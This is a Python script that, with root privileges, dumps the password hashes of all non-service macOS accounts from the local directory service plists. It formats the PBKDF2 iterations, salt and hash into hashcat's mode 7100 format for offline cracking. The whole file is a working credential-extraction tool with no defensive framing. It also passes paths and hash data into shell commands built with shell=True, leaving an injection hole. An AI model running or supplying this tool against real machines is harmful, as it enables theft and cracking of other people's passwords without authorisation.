#!/usr/bin/env python3
"""
Extract macOS shadow password hashes in hashcat format (-m 7100)
Usage: python3 extract_shadow_hashes.py [--user <username>]
"""

import subprocess
import sys
import os
import base64
import re

def run_command(cmd):
    """Run a shell command and return output"""
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            check=True
        )
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"Error running command: {e}", file=sys.stderr)
        return None

def extract_hash_from_plist(plist_path):
    """Extract hash components from a user plist file"""
    try:
        # Get username
        name_output = run_command(f'plutil -extract name.0 raw "{plist_path}"')
        if not name_output:
            return None
        username = name_output.strip()
        
        # Get ShadowHashData
        hash_data = run_command(f'plutil -extract ShadowHashData.0 raw "{plist_path}"')
        if not hash_data:
            return None
        
        # Decode base64
        decoded = base64.b64decode(hash_data)
        
        # Extract components using plutil
        iterations = run_command(f'echo "{hash_data}" | base64 -d | plutil -extract SALTED-SHA512-PBKDF2.iterations raw -')
        salt = run_command(f'echo "{hash_data}" | base64 -d | plutil -extract SALTED-SHA512-PBKDF2.salt raw -')
        entropy = run_command(f'echo "{hash_data}" | base64 -d | plutil -extract SALTED-SHA512-PBKDF2.entropy raw -')
        
        if not all([iterations, salt, entropy]):
            return None
        
        # Convert salt and entropy to hex
        salt_hex = base64.b64decode(salt).hex()
        entropy_hex = base64.b64decode(entropy).hex()
        
        # Format for hashcat: username:$ml$iterations$salt$entropy
        hashcat_format = f"{username}:$ml${iterations}${salt_hex}${entropy_hex}"
        return hashcat_format
        
    except Exception as e:
        print(f"Error processing {plist_path}: {e}", file=sys.stderr)
        return None

def main():
    users_dir = "/var/db/dslocal/nodes/Default/users/"
    
    # Check if running as root
    if os.geteuid() != 0:
        print("This script requires root privileges. Run with sudo.", file=sys.stderr)
        sys.exit(1)
    
    # Parse arguments
    specific_user = None
    if len(sys.argv) > 1:
        if sys.argv[1] == "--user" and len(sys.argv) > 2:
            specific_user = sys.argv[2]
        elif len(sys.argv) > 1 and not sys.argv[1].startswith("--"):
            specific_user = sys.argv[1]
    
    # Find user files
    if specific_user:
        plist_path = os.path.join(users_dir, specific_user)
        if os.path.exists(plist_path):
            hash_result = extract_hash_from_plist(plist_path)
            if hash_result:
                print(hash_result)
            else:
                print(f"Could not extract hash for user: {specific_user}", file=sys.stderr)
                sys.exit(1)
        else:
            print(f"User file not found: {plist_path}", file=sys.stderr)
            sys.exit(1)
    else:
        # Extract all non-service accounts
        for filename in os.listdir(users_dir):
            if filename.startswith("_"):
                continue  # Skip service accounts
            
            plist_path = os.path.join(users_dir, filename)
            if os.path.isfile(plist_path) and os.access(plist_path, os.R_OK):
                hash_result = extract_hash_from_plist(plist_path)
                if hash_result:
                    print(hash_result)

if __name__ == "__main__":
    main()
